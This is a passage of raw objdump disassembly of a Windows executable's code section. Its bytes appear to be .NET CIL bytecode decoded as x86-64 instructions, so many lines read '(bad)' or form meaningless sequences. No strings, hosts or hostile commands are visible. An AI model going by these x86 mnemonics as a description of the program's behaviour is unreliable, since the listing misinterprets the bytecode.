   140002562:	0a 7d 06             	or     0x6(%rbp),%bh
   140002565:	00 00                	add    %al,(%rax)
   140002567:	04 17                	add    $0x17,%al
   140002569:	0a de                	or     %dh,%bl
   14000256b:	09 16                	or     %edx,(%rsi)
   14000256d:	0a de                	or     %dh,%bl
   14000256f:	05 26 de 00 16       	add    $0x1600de26,%eax
   140002574:	2a 06                	sub    (%rsi),%al
   140002576:	2a 00                	sub    (%rax),%al
   140002578:	01 10                	add    %edx,(%rax)
   14000257a:	00 00                	add    %al,(%rax)
   14000257c:	00 00                	add    %al,(%rax)
   14000257e:	00 00                	add    %al,(%rax)
   140002580:	64 64 00 03          	fs add %al,%fs:(%rbx)
   140002584:	19 00                	sbb    %eax,(%rax)
   140002586:	00 01                	add    %al,(%rcx)
   140002588:	13 30                	adc    (%rax),%esi
   14000258a:	03 00                	add    (%rax),%eax
   14000258c:	2f                   	(bad)
   14000258d:	00 00                	add    %al,(%rax)
   14000258f:	00 08                	add    %cl,(%rax)
   140002591:	00 00                	add    %al,(%rax)
   140002593:	11 16                	adc    %edx,(%rsi)
   140002595:	6a 0a                	push   $0xa
   140002597:	03 0b                	add    (%rbx),%ecx
   140002599:	2b 0b                	sub    (%rbx),%ecx
   14000259b:	06                   	(bad)
   14000259c:	02 07                	add    (%rdi),%al
   14000259e:	91                   	xchg   %eax,%ecx
   14000259f:	6e                   	outsb  (%rsi),(%dx)
   1400025a0:	58                   	pop    %rax
   1400025a1:	0a 07                	or     (%rdi),%al
   1400025a3:	17                   	(bad)
   1400025a4:	58                   	pop    %rax
   1400025a5:	0b 07                	or     (%rdi),%eax
   1400025a7:	04 32                	add    $0x32,%al
   1400025a9:	f1                   	int1
   1400025aa:	06                   	(bad)
   1400025ab:	1f                   	(bad)
   1400025ac:	10 64 06 20          	adc    %ah,0x20(%rsi,%rax,1)
   1400025b0:	ff                   	(bad)
   1400025b1:	ff 00                	incl   (%rax)
   1400025b3:	00 6a 5f             	add    %ch,0x5f(%rdx)
   1400025b6:	58                   	pop    %rax
   1400025b7:	0a 06                	or     (%rsi),%al
   1400025b9:	06                   	(bad)
   1400025ba:	1f                   	(bad)
   1400025bb:	10 64 58 0a          	adc    %ah,0xa(%rax,%rbx,2)
   1400025bf:	06                   	(bad)
   1400025c0:	66 69 2a 00 1b       	imul   $0x1b00,(%rdx),%bp
   1400025c5:	30 05 00 86 01 00    	xor    %al,0x18600(%rip)        # 0x14001abcb
   1400025cb:	00 09                	add    %cl,(%rcx)
   1400025cd:	00 00                	add    %al,(%rax)
   1400025cf:	11 73 28             	adc    %esi,0x28(%rbx)
   1400025d2:	00 00                	add    %al,(%rax)
   1400025d4:	06                   	(bad)
   1400025d5:	28 20                	sub    %ah,(%rax)
   1400025d7:	00 00                	add    %al,(%rax)
   1400025d9:	06                   	(bad)
   1400025da:	0a 02                	or     (%rdx),%al
   1400025dc:	06                   	(bad)
   1400025dd:	28 1e                	sub    %bl,(%rsi)
   1400025df:	00 00                	add    %al,(%rax)
   1400025e1:	06                   	(bad)
   1400025e2:	7d 07                	jge    0x1400025eb
   1400025e4:	00 00                	add    %al,(%rax)
   1400025e6:	04 1f                	add    $0x1f,%al
   1400025e8:	1c 8d                	sbb    $0x8d,%al
   1400025ea:	30 00                	xor    %al,(%rax)
   1400025ec:	00 01                	add    %al,(%rcx)
   1400025ee:	0b 73 3f             	or     0x3f(%rbx),%esi
   1400025f1:	00 00                	add    %al,(%rax)
   1400025f3:	0a 20                	or     (%rax),%ah
   1400025f5:	ff                   	(bad)
   1400025f6:	ff                   	(bad)
   1400025f7:	ff 1f                	lcall  *(%rdi)
   1400025f9:	20 ff                	and    %bh,%bh
   1400025fb:	ff                   	(bad)
   1400025fc:	ff                   	(bad)
   1400025fd:	7f 6f                	jg     0x14000266e
   1400025ff:	40 00 00             	rex add %al,(%rax)
   140002602:	0a 6a 20             	or     0x20(%rdx),%ch
   140002605:	00 ff                	add    %bh,%bh
   140002607:	ff                   	(bad)
   140002608:	ff 6e 5f             	ljmp   *0x5f(%rsi)
   14000260b:	69 02 7b 07 00 00    	imul   $0x77b,(%rdx),%eax
   140002611:	04 20                	add    $0x20,%al
   140002613:	ff 00                	incl   (%rax)
   140002615:	00 00                	add    %al,(%rax)
   140002617:	5f                   	pop    %rdi
   140002618:	60                   	(bad)
   140002619:	28 41 00             	sub    %al,0x0(%rcx)
   14000261c:	00 0a                	add    %cl,(%rdx)
   14000261e:	16                   	(bad)
   14000261f:	07                   	(bad)
   140002620:	1e                   	(bad)
   140002621:	1a 28                	sbb    (%rax),%ch
   140002623:	35 00 00 0a 20       	xor    $0x200a0000,%eax
   140002628:	ff                   	(bad)
   140002629:	ff                   	(bad)
   14000262a:	ff 17                	call   *(%rdi)
   14000262c:	28 41 00             	sub    %al,0x0(%rcx)
   14000262f:	00 0a                	add    %cl,(%rdx)
   140002631:	16                   	(bad)
   140002632:	07                   	(bad)
   140002633:	1f                   	(bad)
   140002634:	0c 1a                	or     $0x1a,%al
   140002636:	28 35 00 00 0a 20    	sub    %dh,0x200a0000(%rip)        # 0x1600a263c
   14000263c:	10 00                	adc    %al,(%rax)
   14000263e:	04 00                	add    $0x0,%al
   140002640:	28 41 00             	sub    %al,0x0(%rcx)
   140002643:	00 0a                	add    %cl,(%rdx)
   140002645:	16                   	(bad)
   140002646:	07                   	(bad)
   140002647:	1f                   	(bad)
   140002648:	14 1a                	adc    $0x1a,%al
   14000264a:	28 35 00 00 0a 02    	sub    %dh,0x20a0000(%rip)        # 0x1420a2650
   140002650:	7b 07                	jnp    0x140002659
   140002652:	00 00                	add    %al,(%rax)
   140002654:	04 28                	add    $0x28,%al
   140002656:	41 00 00             	add    %al,(%r8)
   140002659:	0a 16                	or     (%rsi),%dl
   14000265b:	07                   	(bad)
   14000265c:	1f                   	(bad)
   14000265d:	18 1a                	sbb    %bl,(%rdx)
   14000265f:	28 35 00 00 0a 7e    	sub    %dh,0x7e0a0000(%rip)        # 0x1be0a2665
   140002665:	42 00 00             	rex.X add %al,(%rax)
   140002668:	0a 0c 04             	or     (%rsp,%rax,1),%cl
   14000266b:	72 25                	jb     0x140002692
   14000266d:	00 00                	add    %al,(%rax)
   14000266f:	70 28                	jo     0x140002699
   140002671:	2b 00                	sub    (%rax),%eax
   140002673:	00 0a                	add    %cl,(%rdx)
   140002675:	2c 2b                	sub    $0x2b,%al
   140002677:	72 8f                	jb     0x140002608
   140002679:	00 00                	add    %al,(%rax)
   14000267b:	70 1a                	jo     0x140002697
   14000267d:	8d 10                	lea    (%rax),%edx
   14000267f:	00 00                	add    %al,(%rax)
   140002681:	01 25 16 28 43 00    	add    %esp,0x432816(%rip)        # 0x140434e9d
   140002687:	00 0a                	add    %cl,(%rdx)
   140002689:	a2 25 17 06 a2 25 18 	movabs %al,0xa2031825a2061725
   140002690:	03 a2 
   140002692:	25 19 7e 02 00       	and    $0x27e19,%eax
   140002697:	00 04 a2             	add    %al,(%rdx,%riz,4)
   14000269a:	28 44 00 00          	sub    %al,0x0(%rax,%rax,1)
   14000269e:	0a 0c 2b             	or     (%rbx,%rbp,1),%cl
   1400026a1:	2d 72 24 01 00       	sub    $0x12472,%eax
   1400026a6:	70 1b                	jo     0x1400026c3
   1400026a8:	8d 10                	lea    (%rax),%edx
   1400026aa:	00 00                	add    %al,(%rax)
   1400026ac:	01 25 16 28 43 00    	add    %esp,0x432816(%rip)        # 0x140434ec8
   1400026b2:	00 0a                	add    %cl,(%rdx)
   1400026b4:	a2 25 17 06 a2 25 18 	movabs %al,0xa2031825a2061725
   1400026bb:	03 a2 
   1400026bd:	25 19 7e 02 00       	and    $0x27e19,%eax
   1400026c2:	00 04 a2             	add    %al,(%rdx,%riz,4)
   1400026c5:	25 1a 04 a2 28       	and    $0x28a2041a,%eax
   1400026ca:	44 00 00             	add    %r8b,(%rax)
   1400026cd:	0a 0c 28             	or     (%rax,%rbp,1),%cl
   1400026d0:	45 00 00             	add    %r8b,(%r8)
   1400026d3:	0a 08                	or     (%rax),%cl
   1400026d5:	6f                   	outsl  (%rsi),(%dx)
   1400026d6:	46 00 00             	rex.RX add %r8b,(%rax)
   1400026d9:	0a 0d 07 8e 69 09    	or     0x9698e07(%rip),%cl        # 0x14969b4e6
   1400026df:	8e 69 58             	mov    0x58(%rcx),%gs
   1400026e2:	8d 30                	lea    (%rax),%esi
   1400026e4:	00 00                	add    %al,(%rax)
   1400026e6:	01 13                	add    %edx,(%rbx)
   1400026e8:	04 11                	add    $0x11,%al
   1400026ea:	04 8e                	add    $0x8e,%al
   1400026ec:	69 28 41 00 00 0a    	imul   $0xa000041,(%rax),%ebp
   1400026f2:	16                   	(bad)
   1400026f3:	07                   	(bad)
   1400026f4:	16                   	(bad)
   1400026f5:	1a 28                	sbb    (%rax),%ch
   1400026f7:	35 00 00 0a 09       	xor    $0x90a0000,%eax
   1400026fc:	8e 69 28             	mov    0x28(%rcx),%gs
   1400026ff:	41 00 00             	add    %al,(%r8)
   140002702:	0a 16                	or     (%rsi),%dl
   140002704:	07                   	(bad)
   140002705:	1f                   	(bad)
   140002706:	10 1a                	adc    %bl,(%rdx)
   140002708:	28 35 00 00 0a 07    	sub    %dh,0x70a0000(%rip)        # 0x1470a270e
   14000270e:	11 04 07             	adc    %eax,(%rdi,%rax,1)
   140002711:	8e 69 28             	mov    0x28(%rcx),%gs
   140002714:	47 00 00             	rex.RXB add %r8b,(%r8)
   140002717:	0a 09                	or     (%rcx),%cl
   140002719:	16                   	(bad)
   14000271a:	11 04 07             	adc    %eax,(%rdi,%rax,1)
   14000271d:	8e 69 09             	mov    0x9(%rcx),%gs
   140002720:	8e 69 28             	mov    0x28(%rcx),%gs
   140002723:	35 00 00 0a 11       	xor    $0x110a0000,%eax
   140002728:	04 16                	add    $0x16,%al
   14000272a:	11 04 8e             	adc    %eax,(%rsi,%rcx,4)
   14000272d:	69 28 14 00 00 06    	imul   $0x6000014,(%rax),%ebp
   140002733:	28 41 00             	sub    %al,0x0(%rcx)
   140002736:	00 0a                	add    %cl,(%rdx)
   140002738:	16                   	(bad)
   140002739:	11 04 1a             	adc    %eax,(%rdx,%rbx,1)
   14000273c:	1a 28                	sbb    (%rax),%ch
   14000273e:	35 00 00 0a 02       	xor    $0x20a0000,%eax
   140002743:	11 04 28             	adc    %eax,(%rax,%rbp,1)
   140002746:	18 00                	sbb    %al,(%rax)
   140002748:	00 06                	add    %al,(%rsi)
   14000274a:	13 05 de 05 26 de    	adc    -0x21d9fa22(%rip),%eax        # 0x11e262d2e
   140002750:	00 16                	add    %dl,(%rsi)
   140002752:	2a 11                	sub    (%rcx),%dl
   140002754:	05 2a 00 00 41       	add    $0x4100002a,%eax
   140002759:	1c 00                	sbb    $0x0,%al
	...
   140002763:	00 7e 01             	add    %bh,0x1(%rsi)
   140002766:	00 00                	add    %al,(%rax)
   140002768:	7e 01                	jle    0x14000276b
   14000276a:	00 00                	add    %al,(%rax)
   14000276c:	03 00                	add    (%rax),%eax
   14000276e:	00 00                	add    %al,(%rax)
   140002770:	19 00                	sbb    %eax,(%rax)
   140002772:	00 01                	add    %al,(%rcx)
   140002774:	6e                   	outsb  (%rsi),(%dx)
   140002775:	02 7b 08             	add    0x8(%rbx),%bh
   140002778:	00 00                	add    %al,(%rax)
   14000277a:	04 20                	add    $0x20,%al
   14000277c:	10 27                	adc    %ah,(%rdi)
   14000277e:	00 00                	add    %al,(%rax)
   140002780:	6f                   	outsl  (%rsi),(%dx)
   140002781:	48 00 00             	rex.W add %al,(%rax)
   140002784:	0a 2d 02 14 2a 02    	or     0x22a1402(%rip),%ch        # 0x1422a3b8c
   14000278a:	7b 05                	jnp    0x140002791
   14000278c:	00 00                	add    %al,(%rax)
   14000278e:	04 2a                	add    $0x2a,%al
   140002790:	1b 30                	sbb    (%rax),%esi
   140002792:	05 00 7d 00 00       	add    $0x7d00,%eax
   140002797:	00 0a                	add    %cl,(%rdx)
   140002799:	00 00                	add    %al,(%rax)
   14000279b:	11 16                	adc    %edx,(%rsi)
   14000279d:	0a 16                	or     (%rsi),%dl
   14000279f:	0b 20                	or     (%rax),%esp
   1400027a1:	00 00                	add    %al,(%rax)
   1400027a3:	40 01 8d 30 00 00 01 	rex add %ecx,0x1000030(%rbp)
   1400027aa:	0c 20                	or     $0x20,%al
   1400027ac:	00 10                	add    %dl,(%rax)
   1400027ae:	00 00                	add    %al,(%rax)
   1400027b0:	8d 30                	lea    (%rax),%esi
   1400027b2:	00 00                	add    %al,(%rax)
   1400027b4:	01 0d 02 7b 04 00    	add    %ecx,0x47b02(%rip)        # 0x14004a2bc
   1400027ba:	00 04 09             	add    %al,(%rcx,%rcx,1)
   1400027bd:	6f                   	outsl  (%rsi),(%dx)
   1400027be:	49 00 00             	rex.WB add %al,(%r8)
   1400027c1:	0a 13                	or     (%rbx),%dl
   1400027c3:	04 11                	add    $0x11,%al
   1400027c5:	04 16                	add    $0x16,%al
   1400027c7:	32 4a 09             	xor    0x9(%rdx),%cl
   1400027ca:	16                   	(bad)
   1400027cb:	08 07                	or     %al,(%rdi)
   1400027cd:	11 04 28             	adc    %eax,(%rax,%rbp,1)
   1400027d0:	35 00 00 0a 07       	xor    $0x70a0000,%eax
   1400027d5:	11 04 58             	adc    %eax,(%rax,%rbx,2)
   1400027d8:	0b 06                	or     (%rsi),%eax
   1400027da:	2d 0c 07 1a 31       	sub    $0x311a070c,%eax
   1400027df:	08 08                	or     %cl,(%rax)
   1400027e1:	16                   	(bad)
   1400027e2:	28 34 00             	sub    %dh,(%rax,%rax,1)
   1400027e5:	00 0a                	add    %cl,(%rdx)
   1400027e7:	0a 07                	or     (%rdi),%al
   1400027e9:	06                   	(bad)
   1400027ea:	32 bf 02 06 8d 30    	xor    0x308d0602(%rdi),%bh
   1400027f0:	00 00                	add    %al,(%rax)
   1400027f2:	01 7d 05             	add    %edi,0x5(%rbp)
   1400027f5:	00 00                	add    %al,(%rax)
   1400027f7:	04 08                	add    $0x8,%al
   1400027f9:	16                   	(bad)
   1400027fa:	02 7b 05             	add    0x5(%rbx),%bh
   1400027fd:	00 00                	add    %al,(%rax)
   1400027ff:	04 16                	add    $0x16,%al
   140002801:	06                   	(bad)
   140002802:	28 35 00 00 0a 02    	sub    %dh,0x20a0000(%rip)        # 0x1420a2808
   140002808:	7b 08                	jnp    0x140002812
   14000280a:	00 00                	add    %al,(%rax)
   14000280c:	04 6f                	add    $0x6f,%al
   14000280e:	4a 00 00             	rex.WX add %al,(%rax)
   140002811:	0a 26                	or     (%rsi),%ah
   140002813:	de 03                	fiadds (%rbx)
   140002815:	26 de 00             	es fiadds (%rax)
   140002818:	2a 00                	sub    (%rax),%al
   14000281a:	00 00                	add    %al,(%rax)
   14000281c:	01 10                	add    %edx,(%rax)
   14000281e:	00 00                	add    %al,(%rax)
   140002820:	00 00                	add    %al,(%rax)
   140002822:	0f 00 6a 79          	verw   0x79(%rdx)
   140002826:	00 03                	add    %al,(%rbx)
   140002828:	19 00                	sbb    %eax,(%rax)
   14000282a:	00 01                	add    %al,(%rcx)
   14000282c:	1b 30                	sbb    (%rax),%esi
   14000282e:	02 00                	add    (%rax),%al
   140002830:	2e 00 00             	cs add %al,(%rax)
   140002833:	00 0b                	add    %cl,(%rbx)
   140002835:	00 00                	add    %al,(%rax)
   140002837:	11 16                	adc    %edx,(%rsi)
   140002839:	0a 2b                	or     (%rbx),%ch
   14000283b:	19 02                	sbb    %eax,(%rdx)
   14000283d:	7b 04                	jnp    0x140002843
   14000283f:	00 00                	add    %al,(%rax)
   140002841:	04 03                	add    $0x3,%al
   140002843:	6f                   	outsl  (%rsi),(%dx)
   140002844:	4b 00 00             	rex.WXB add %al,(%r8)
   140002847:	0a 0b                	or     (%rbx),%cl
   140002849:	07                   	(bad)
   14000284a:	16                   	(bad)
   14000284b:	2f                   	(bad)
   14000284c:	04 16                	add    $0x16,%al
   14000284e:	0c de                	or     $0xde,%al
   140002850:	13 06                	adc    (%rsi),%eax
   140002852:	07                   	(bad)
   140002853:	58                   	pop    %rax
   140002854:	0a 06                	or     (%rsi),%al
   140002856:	03 8e 69 32 e1 17    	add    0x17e13269(%rsi),%ecx
   14000285c:	0c de                	or     $0xde,%al
   14000285e:	05 26 de 00 16       	add    $0x1600de26,%eax
   140002863:	2a 08                	sub    (%rax),%cl
   140002865:	2a 00                	sub    (%rax),%al
   140002867:	00 01                	add    %al,(%rcx)
   140002869:	10 00                	adc    %al,(%rax)
   14000286b:	00 00                	add    %al,(%rax)
   14000286d:	00 00                	add    %al,(%rax)
   14000286f:	00 27                	add    %ah,(%rdi)
   140002871:	27                   	(bad)
   140002872:	00 03                	add    %al,(%rbx)
   140002874:	10 00                	adc    %al,(%rax)
   140002876:	00 01                	add    %al,(%rcx)
   140002878:	13 30                	adc    (%rax),%esi
   14000287a:	02 00                	add    (%rax),%al
   14000287c:	15 00 00 00 0c       	adc    $0xc000000,%eax
   140002881:	00 00                	add    %al,(%rax)
   140002883:	11 02                	adc    %eax,(%rdx)
   140002885:	12 00                	adc    (%rax),%al
   140002887:	28 4c 00 00          	sub    %cl,0x0(%rax,%rax,1)
   14000288b:	0a 2d 09 02 28 4d    	or     0x4d280209(%rip),%ch        # 0x18d282a9a
   140002891:	00 00                	add    %al,(%rax)
   140002893:	0a 16                	or     (%rsi),%dl
   140002895:	9a                   	(bad)
   140002896:	2a 06                	sub    (%rsi),%al
   140002898:	2a 00                	sub    (%rax),%al
   14000289a:	00 00                	add    %al,(%rax)
   14000289c:	13 30                	adc    (%rax),%esi
   14000289e:	02 00                	add    (%rax),%al
   1400028a0:	40 00 00             	rex add %al,(%rax)
   1400028a3:	00 00                	add    %al,(%rax)
   1400028a5:	00 00                	add    %al,(%rax)
   1400028a7:	00 02                	add    %al,(%rdx)
   1400028a9:	7b 04                	jnp    0x1400028af
   1400028ab:	00 00                	add    %al,(%rax)
   1400028ad:	04 2c                	add    $0x2c,%al
   1400028af:	1d 02 7b 04 00       	sbb    $0x47b02,%eax
   1400028b4:	00 04 6f             	add    %al,(%rdi,%rbp,2)
   1400028b7:	4e 00 00             	rex.WRX add %r8b,(%rax)
   1400028ba:	0a 02                	or     (%rdx),%al
   1400028bc:	7b 04                	jnp    0x1400028c2
   1400028be:	00 00                	add    %al,(%rax)
   1400028c0:	04 6f                	add    $0x6f,%al
   1400028c2:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   1400028c5:	0a 02                	or     (%rdx),%al
   1400028c7:	14 7d                	adc    $0x7d,%al
   1400028c9:	04 00                	add    $0x0,%al
   1400028cb:	00 04 02             	add    %al,(%rdx,%rax,1)
   1400028ce:	7b 06                	jnp    0x1400028d6
   1400028d0:	00 00                	add    %al,(%rax)
   1400028d2:	04 2c                	add    $0x2c,%al
   1400028d4:	12 02                	adc    (%rdx),%al
   1400028d6:	7b 06                	jnp    0x1400028de
   1400028d8:	00 00                	add    %al,(%rax)
   1400028da:	04 6f                	add    $0x6f,%al
   1400028dc:	50                   	push   %rax
   1400028dd:	00 00                	add    %al,(%rax)
   1400028df:	0a 02                	or     (%rdx),%al
   1400028e1:	14 7d                	adc    $0x7d,%al
   1400028e3:	06                   	(bad)
   1400028e4:	00 00                	add    %al,(%rax)
   1400028e6:	04 2a                	add    $0x2a,%al
   1400028e8:	4e 02 16             	rex.WRX add (%rsi),%r10b
   1400028eb:	73 51                	jae    0x14000293e
   1400028ed:	00 00                	add    %al,(%rax)
   1400028ef:	0a 7d 08             	or     0x8(%rbp),%bh
   1400028f2:	00 00                	add    %al,(%rax)
   1400028f4:	04 02                	add    $0x2,%al
   1400028f6:	28 36                	sub    %dh,(%rsi)
   1400028f8:	00 00                	add    %al,(%rax)
   1400028fa:	0a 2a                	or     (%rdx),%ch
   1400028fc:	1b 30                	sbb    (%rax),%esi
   1400028fe:	01 00                	add    %eax,(%rax)
   140002900:	10 00                	adc    %al,(%rax)
   140002902:	00 00                	add    %al,(%rax)
   140002904:	00 00                	add    %al,(%rax)
   140002906:	00 00                	add    %al,(%rax)
   140002908:	02 28                	add    (%rax),%ch
   14000290a:	23 00                	and    (%rax),%eax
   14000290c:	00 06                	add    %al,(%rsi)
   14000290e:	de 07                	fiadds (%rdi)
   140002910:	02 28                	add    (%rax),%ch
   140002912:	10 00                	adc    %al,(%rax)
   140002914:	00 0a                	add    %cl,(%rdx)
   140002916:	dc 2a                	fsubrl (%rdx)
   140002918:	01 10                	add    %edx,(%rax)
   14000291a:	00 00                	add    %al,(%rax)
   14000291c:	02 00                	add    (%rax),%al
   14000291e:	00 00                	add    %al,(%rax)
   140002920:	08 08                	or     %cl,(%rax)
   140002922:	00 07                	add    %al,(%rdi)
   140002924:	00 00                	add    %al,(%rax)
   140002926:	00 00                	add    %al,(%rax)
   140002928:	13 30                	adc    (%rax),%esi
   14000292a:	05 00 2f 00 00       	add    $0x2f00,%eax
   14000292f:	00 08                	add    %cl,(%rax)
   140002931:	00 00                	add    %al,(%rax)
   140002933:	11 15 6e 0a 16 0b    	adc    %edx,0xb160a6e(%rip)        # 0x14b1633a7
   140002939:	2b 1d 06 1e 64 7e    	sub    0x7e641e06(%rip),%ebx        # 0x1be644745
   14000293f:	09 00                	or     %eax,(%rax)
   140002941:	00 04 06             	add    %al,(%rsi,%rax,1)
   140002944:	20 ff                	and    %bh,%bh
   140002946:	00 00                	add    %al,(%rax)
   140002948:	00 6a 5f             	add    %ch,0x5f(%rdx)
   14000294b:	02 07                	add    (%rdi),%al
   14000294d:	91                   	xchg   %eax,%ecx
   14000294e:	6e                   	outsb  (%rsi),(%dx)
   14000294f:	61                   	(bad)
   140002950:	8a 96 61 0a 07 17    	mov    0x17070a61(%rsi),%dl
   140002956:	58                   	pop    %rax
   140002957:	0b 07                	or     (%rdi),%eax
   140002959:	02 8e 69 32 dd 06    	add    0x6dd3269(%rsi),%cl
   14000295f:	15 6e 61 2a 4a       	adc    $0x4a2a616e,%eax
   140002964:	28 45 00             	sub    %al,0x0(%rbp)
   140002967:	00 0a                	add    %cl,(%rdx)
   140002969:	02 6f 46             	add    0x46(%rdi),%ch
   14000296c:	00 00                	add    %al,(%rax)
   14000296e:	0a 28                	or     (%rax),%ch
   140002970:	1d 00 00 06 69       	sbb    $0x69060000,%eax
   140002975:	2a 00                	sub    (%rax),%al
   140002977:	00 13                	add    %dl,(%rbx)
   140002979:	30 02                	xor    %al,(%rdx)
   14000297b:	00 44 00 00          	add    %al,0x0(%rax,%rax,1)
   14000297f:	00 0d 00 00 11 28    	add    %cl,0x28110000(%rip)        # 0x168112985
   140002985:	52                   	push   %rdx
   140002986:	00 00                	add    %al,(%rax)
   140002988:	0a 7e 42             	or     0x42(%rsi),%bh
   14000298b:	00 00                	add    %al,(%rax)
   14000298d:	0a 0a                	or     (%rdx),%cl
   14000298f:	0b 16                	or     (%rsi),%edx
   140002991:	0c 2b                	or     $0x2b,%al
   140002993:	28 07                	sub    %al,(%rdi)
   140002995:	08 9a 0d 06 7e 42    	or     %bl,0x427e060d(%rdx)
   14000299b:	00 00                	add    %al,(%rax)
   14000299d:	0a 28                	or     (%rax),%ch
   14000299f:	2b 00                	sub    (%rax),%eax
   1400029a1:	00 0a                	add    %cl,(%rdx)
   1400029a3:	2c 13                	sub    $0x13,%al
   1400029a5:	09 6f 53             	or     %ebp,0x53(%rdi)
   1400029a8:	00 00                	add    %al,(%rax)
   1400029aa:	0a 26                	or     (%rsi),%ah
   1400029ac:	09 6f 54             	or     %ebp,0x54(%rdi)
   1400029af:	00 00                	add    %al,(%rax)
   1400029b1:	0a 6f 55             	or     0x55(%rdi),%ch
   1400029b4:	00 00                	add    %al,(%rax)
   1400029b6:	0a 2a                	or     (%rdx),%ch
   1400029b8:	08 17                	or     %dl,(%rdi)
   1400029ba:	58                   	pop    %rax
   1400029bb:	0c 08                	or     $0x8,%al
   1400029bd:	07                   	(bad)
   1400029be:	8e 69 32             	mov    0x32(%rcx),%gs
   1400029c1:	d2 72 d9             	shlb   %cl,-0x27(%rdx)
   1400029c4:	01 00                	add    %eax,(%rax)
   1400029c6:	70 2a                	jo     0x1400029f2
   1400029c8:	13 30                	adc    (%rax),%esi
   1400029ca:	07                   	(bad)
   1400029cb:	00 a7 00 00 00 0e    	add    %ah,0xe000000(%rdi)
   1400029d1:	00 00                	add    %al,(%rax)
   1400029d3:	11 28                	adc    %ebp,(%rax)
   1400029d5:	45 00 00             	add    %r8b,(%r8)
   1400029d8:	0a 02                	or     (%rdx),%al
   1400029da:	28 1f                	sub    %bl,(%rdi)
   1400029dc:	00 00                	add    %al,(%rax)
   1400029de:	06                   	(bad)
   1400029df:	6f                   	outsl  (%rsi),(%dx)
   1400029e0:	46 00 00             	rex.RX add %r8b,(%rax)
   1400029e3:	0a 28                	or     (%rax),%ch
   1400029e5:	1d 00 00 06 0a       	sbb    $0xa060000,%eax
   1400029ea:	02 28                	add    (%rax),%ch
   1400029ec:	21 00                	and    %eax,(%rax)
   1400029ee:	00 06                	add    %al,(%rsi)
   1400029f0:	0b 02                	or     (%rdx),%eax
   1400029f2:	28 22                	sub    %ah,(%rdx)
   1400029f4:	00 00                	add    %al,(%rax)
   1400029f6:	06                   	(bad)
   1400029f7:	0c 72                	or     $0x72,%al
   1400029f9:	dd 01                	fldl   (%rcx)
   1400029fb:	00 70 72             	add    %dh,0x72(%rax)
   1400029fe:	e1 01                	loope  0x140002a01
   140002a00:	00 70 1d             	add    %dh,0x1d(%rax)
   140002a03:	8d 10                	lea    (%rax),%edx
   140002a05:	00 00                	add    %al,(%rax)
   140002a07:	01 25 16 07 8c 3f    	add    %esp,0x3f8c0716(%rip)        # 0x17f8c3123
   140002a0d:	00 00                	add    %al,(%rax)
   140002a0f:	01 a2 25 17 06 1f    	add    %esp,0x1f061725(%rdx)
   140002a15:	10 64 8c 40          	adc    %ah,0x40(%rsp,%rcx,4)
   140002a19:	00 00                	add    %al,(%rax)
   140002a1b:	01 a2 25 18 06 20    	add    %esp,0x20061825(%rdx)
   140002a21:	ff                   	(bad)
   140002a22:	ff 00                	incl   (%rax)
   140002a24:	00 6a 5f             	add    %ch,0x5f(%rdx)
   140002a27:	8c 40 00             	mov    %es,0x0(%rax)
   140002a2a:	00 01                	add    %al,(%rcx)
   140002a2c:	a2 25 19 08 17 95 1f 	movabs %al,0x64101f9517081925
   140002a33:	10 64 
   140002a35:	8c 3f                	mov    %?,(%rdi)
   140002a37:	00 00                	add    %al,(%rax)
   140002a39:	01 a2 25 1a 08 17    	add    %esp,0x17081a25(%rdx)
   140002a3f:	95                   	xchg   %eax,%ebp
   140002a40:	20 ff                	and    %bh,%bh
   140002a42:	ff 00                	incl   (%rax)
   140002a44:	00 5f 8c             	add    %bl,-0x74(%rdi)
   140002a47:	3f                   	(bad)
   140002a48:	00 00                	add    %al,(%rax)
   140002a4a:	01 a2 25 1b 08 18    	add    %esp,0x18081b25(%rdx)
   140002a50:	95                   	xchg   %eax,%ebp
   140002a51:	1f                   	(bad)
   140002a52:	10 64 8c 3f          	adc    %ah,0x3f(%rsp,%rcx,4)
   140002a56:	00 00                	add    %al,(%rax)
   140002a58:	01 a2 25 1c 08 19    	add    %esp,0x19081c25(%rdx)
   140002a5e:	95                   	xchg   %eax,%ebp
   140002a5f:	20 ff                	and    %bh,%bh
   140002a61:	ff 00                	incl   (%rax)
   140002a63:	00 5f 8c             	add    %bl,-0x74(%rdi)
   140002a66:	3f                   	(bad)
   140002a67:	00 00                	add    %al,(%rax)
   140002a69:	01 a2 28 44 00 00    	add    %esp,0x4428(%rdx)
   140002a6f:	0a 72 3f             	or     0x3f(%rdx),%dh
   140002a72:	02 00                	add    (%rax),%al
   140002a74:	70 28                	jo     0x140002a9e
   140002a76:	56                   	push   %rsi
   140002a77:	00 00                	add    %al,(%rax)
   140002a79:	0a 2a                	or     (%rdx),%ch
   140002a7b:	5a                   	pop    %rdx
   140002a7c:	28 45 00             	sub    %al,0x0(%rbp)
   140002a7f:	00 0a                	add    %cl,(%rdx)
   140002a81:	28 43 00             	sub    %al,0x0(%rbx)
   140002a84:	00 0a                	add    %cl,(%rdx)
   140002a86:	6f                   	outsl  (%rsi),(%dx)
   140002a87:	46 00 00             	rex.RX add %r8b,(%rax)
   140002a8a:	0a 28                	or     (%rax),%ch
   140002a8c:	1d 00 00 06 6d       	sbb    $0x6d060000,%eax
   140002a91:	2a 00                	sub    (%rax),%al
   140002a93:	00 13                	add    %dl,(%rbx)
   140002a95:	30 05 00 46 00 00    	xor    %al,0x4600(%rip)        # 0x14000709b
   140002a9b:	00 0f                	add    %cl,(%rdi)
   140002a9d:	00 00                	add    %al,(%rax)
   140002a9f:	11 02                	adc    %eax,(%rdx)
   140002aa1:	28 24 00             	sub    %ah,(%rax,%rax,1)
   140002aa4:	00 06                	add    %al,(%rsi)
   140002aa6:	1f                   	(bad)
   140002aa7:	10 8d 30 00 00 01    	adc    %cl,0x1000030(%rbp)
   140002aad:	0a 02                	or     (%rdx),%al
   140002aaf:	16                   	(bad)
   140002ab0:	06                   	(bad)
   140002ab1:	28 25 00 00 06 1a    	sub    %ah,0x1a060000(%rip)        # 0x15a062ab7
   140002ab7:	8d 3f                	lea    (%rdi),%edi
   140002ab9:	00 00                	add    %al,(%rax)
   140002abb:	01 25 16 06 16 28    	add    %esp,0x28160616(%rip)        # 0x1681630d7
   140002ac1:	57                   	push   %rdi
   140002ac2:	00 00                	add    %al,(%rax)
   140002ac4:	0a 9e 25 17 06 1a    	or     0x1a061725(%rsi),%bl
   140002aca:	28 57 00             	sub    %dl,0x0(%rdi)
   140002acd:	00 0a                	add    %cl,(%rdx)
   140002acf:	9e                   	sahf
   140002ad0:	25 18 06 1e 28       	and    $0x281e0618,%eax
   140002ad5:	57                   	push   %rdi
